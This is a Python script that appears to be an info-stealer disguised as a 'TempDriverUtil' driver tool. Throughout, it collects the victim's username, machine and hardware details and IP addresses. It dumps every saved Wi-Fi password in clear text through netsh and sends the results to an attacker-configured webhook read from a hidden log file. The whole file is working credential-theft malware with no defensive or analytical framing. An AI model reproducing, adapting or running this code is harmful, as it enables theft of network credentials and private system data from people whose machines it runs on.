#imports
import subprocess, requests, os, platform, psutil

#unpacking variable file
Variables = open("C:\Program Files (x86)\Temp\DriverUtilLog.txt", 'r').read().split(",")
WebH = Variables[0]
sendSysInfo = Variables[1].lower()
sendWifiData = Variables[2].lower()
useSpoilers = Variables[3].lower()

#s.1 basic system info
WinUser = os.getlogin()
ComputerName = platform.node()
WinArch = str(platform.architecture()[0]).replace("bit", "x")
WinVer = str(subprocess.check_output("wmic os get name").decode('utf-8').split("\n")[1])

#Processor (CPU)
Processor = str(subprocess.check_output("wmic cpu get name").decode('utf-8').split("\n")[1][:-2])

#Graphics Processor (only works on nvidia gpus)
GPUName = str(subprocess.check_output("nvidia-smi -L").decode('utf-8')[7:-50])

if "NVIDIA" not in GPUName:
	GPUName = "GPU Is Not NVIDIA Brand"

#memory
MemTotal = psutil.virtual_memory().total

#s.2 wifi names and passwords (wifi data = WifiStuff[:-1]) (failure is likely due to an absence of a password)
WifiStuff = ""
EncryptedWifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
DecryptedWifi = EncryptedWifi.decode('utf-8', errors ="backslashreplace")
DecryptedWifi = DecryptedWifi.split('\n')
profiles = []
for segment in DecryptedWifi:
	if "All User Profile" in segment :
		segment = segment.split(":")
		segment = segment[1]
		segment = segment[1:-1]
		profiles.append(segment) 
for segment in profiles:
	try:
		results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', segment, 'key=clear'])
		results = results.decode('utf-8', errors ="backslashreplace")
		results = results.split('\n')
		results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
		try:
			WifiStuff = WifiStuff + "{:<40}. . . . . . {:<}\n".format(segment, results[0])
			print("Password Found...")
		except IndexError:
			print("No Password Found...")
	except subprocess.CalledProcessError:
		print("Error With Wifi Name Or Decode...")

#get ip data
ipv4 = subprocess.check_output("ipconfig | findstr /i ipv4", shell=True)
ipv4 = ipv4.decode('utf-8')

ipv6 = subprocess.check_output("ipconfig | findstr /i ipv6", shell=True)
ipv6 = ipv6.decode('utf-8')

#Making data for sysinfo webhook embed
if useSpoilers == "true":
	WebHookData1 = {
		"username": "TempDriverUtil",
		"embeds": [{
			"title": "Sys Info",
			"description": f"System Username: ||{WinUser}||\nSystem Name: ||{ComputerName}||\nVersion: ||{WinVer[:20]} {WinArch}||\nProcessor: ||{Processor}||\nGraphics Processor: ||{GPUName}||\nTotal Memory: ||{MemTotal:,} Bytes||"
	    }]
	}

	#making data for wifi webhook embed
	WebHookData2 = {
		"username": "TempDriverUtil",
		"embeds": [{
			"title": "Wifi Data",
			"description": f"IPv4:\n||{ipv4}||\nIPv6:\n||{ipv6}||\n **Wifi Names And Passwords**\n---NAMES-------------PASSWORDS---------\n||{WifiStuff}||"
    	}]
	}
elif useSpoilers == "false":
	WebHookData1 = {
		"username": "TempDriverUtil",
		"embeds": [{
			"title": "Sys Info",
			"description": f"System Username: {WinUser}\nSystem Name: {ComputerName}\nVersion: {WinVer[:20]} {WinArch}\nProcessor: {Processor}\nGraphics Processor: {GPUName}\nTotal Memory: {MemTotal:,} Bytes"
	    }]
	}

	#making data for wifi webhook embed
	WebHookData2 = {
		"username": "TempDriverUtil",
		"embeds": [{
			"title": "Wifi Data",
			"description": f"IPv4:\n{ipv4}\nIPv6:\n{ipv6}\n **Wifi Names And Passwords**\n---NAMES-------------PASSWORDS---------\n{WifiStuff}"
    	}]
	}

#sending webhooks
if sendSysInfo == "true":
	WebhookForSend = requests.post(WebH, json=WebHookData1)
if sendWifiData == "true":
	WebhookForSend = requests.post(WebH, json=WebHookData2)